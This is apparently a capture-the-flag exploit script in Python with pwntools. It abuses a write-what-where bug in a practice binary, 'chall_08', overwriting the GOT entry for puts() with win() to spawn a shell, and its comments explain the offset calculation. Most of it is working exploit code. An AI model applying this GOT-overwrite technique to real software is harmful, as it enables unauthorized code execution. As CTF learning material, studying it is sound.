'''
WRITE-WHAT-WHERE
Flaws: No canary, No RELRO, No PIE, Symbols, win()
Security: NX enabled
'''
from pwn import *

'''
main() is basically just a WRITE-WHAT-WHERE, 
i.e., you can WRITE any 64-bit value you like in any RW segment. 
And, well, the GOT (Global Offset Table) puts() entry is an easy target, 
just replace WITH win() and get a shell when puts("hi") is called.

Our WRITE is relative to target (a global variable), 
so just subtract the target address from the puts() address and divide by 8 to compute the WHERE. 
The WHAT is just win()
'''
elf = ELF("./chall_08")
p = process("./chall_08")
payload1 = str((elf.got.puts - elf.sym.target) // 8)
print(elf.got.puts)
print(elf.sym.target)
print(elf.got.puts - elf.sym.target)
print(payload1)
p.sendline(payload1)

payload2 = str(elf.sym.win)
p.sendline(payload2)
p.interactive()
